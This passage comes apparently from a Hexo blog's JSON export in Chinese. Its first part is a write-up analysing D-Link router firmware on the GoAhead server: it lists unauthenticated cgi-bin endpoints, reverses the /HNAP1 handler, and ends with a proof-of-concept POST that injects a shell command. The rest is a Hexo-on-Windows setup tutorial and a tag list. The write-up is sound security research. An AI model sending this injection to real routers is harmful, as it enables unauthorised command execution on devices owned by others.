GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。websUrlHandlerDefine(T(\"/goform\"), NULL, 0, websFormHandler, 0); /goform的请求交给websFormHandler函数处理websUrlHandlerDefine(T(\"/cgi-bin\"), NULL, 0, websCgiHandler, 0); /cgi-bin的请求交给websCgiHandler函数处理。 模拟运行固件环境使用工具firmware-ayalysis-toolkit。 搭建教程：https://zhuanlan.zhihu.com/p/110806057 运行起来后nmap扫端口，发现开了http服务和dns服务。 访问http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。 在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。 未授权访问/cgi-bin/ExportSettings.sh 导出配置文件，造成信息泄露。 /cgi-bin/upload_settings.cgi 导入配置文件，可导入恶意篡改后的配置。 /cgi-bin/GetDownLoadSyslog.sh 获取系统部分启动信息/var/log/messages* /cgi-bin/upload_firmware.cgi 上传更新固件，可恶意修改固件 goahead 自定义的请求处理函数 处理函数的参数列表：int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t path, char_t query)goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节. IDA打开goahead分析： 通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C. websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。 抓取登录数据包，发现往/HNAP1发送。 分析/HNAP1（0x42383C）处理函数逻辑: 从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。 找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。 此处可以直接注入’来命令执行。 在PHP中常用到以下几个函数来执行外部命令:system system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能 execpassthrushell_exec POC1234567891011POST /HNAP1/ HTTP/1.1Host: 192.168.0.1Content-Length: 53User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: text/xml; charset=UTF-8Accept: */*SOAPAction: \"http://purenetworks.com/HNAP1/Login\"Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"}]},{"title":"Win10下使用Hexo搭建个人博客","slug":"Win10下使用Hexo搭建个人博客","date":"2022-08-07T08:48:45.000Z","updated":"2022-08-07T13:51:00.834Z","comments":true,"path":"2022/08/07/Win10下使用Hexo搭建个人博客/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"下载安装git、nodejs下载地址: git: https://git-scm.com/ nodejs: http://nodejs.cn/download/ 将nodejs加入path环境变量中。打开cmd测试： 报错1：输入 npm-v 出现报错: npm WARN config global --global, --local are deprecated. Use `–location 解决方法：打开nodejs安装位置文件夹，打开npm.cmd和npm，将文件中的prefix -g替换为prefix --location=global,保存后重新打开cmd测试即可。 安装hexo换源（淘宝源）npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm -v 查看版本以及是否安装成功。 安装hexocnpm install -g hexo-cli hexo -v 新建文件夹放置博客内容，在cmd中进入所建立的目录： hexo init #初始化hexo hexo s #启动hexo 访问 http://localhost:4000/如下即成功： 新建文章hexo new &quot;文章标题&quot; 在目录&#x2F;source&#x2F;_posts&#x2F;下生成文件.md更新文章： hexo clean hexo g hexo s 部署github1、建立一个新的库，命名需要符合规则：username.gitgub.io2、命令行输入： cnpm install --save hexo-deployer-git 3、更改设置 找到_config.yml文件，翻到最底部 将type改为git 添加repo: &quot;此处为仓库地址&quot; 添加branch: master repo为仓库地址 branch为master即可 4、部署到远端 git config --global user.email &quot;xxx(此处为邮箱)&quot; git config --global user.name &quot;xxx(此处为用户名)&quot; #github用户名 hexo d 弹出网页提示是否关联git和github 授权即可","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"},{"name":"chrome","slug":"chrome","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome/"},{"name":"环境搭建","slug":"环境搭建","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"bp","slug":"bp","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/bp/"},{"name":"IOT 《物联网渗透测试》","slug":"IOT-《物联网渗透测试》","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/"},{"name":"IOT","slug":"IOT","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"},{"name":"web","slug":"web","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/web/"},{"name":"chrome知识点","slug":"chrome知识点","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"}]}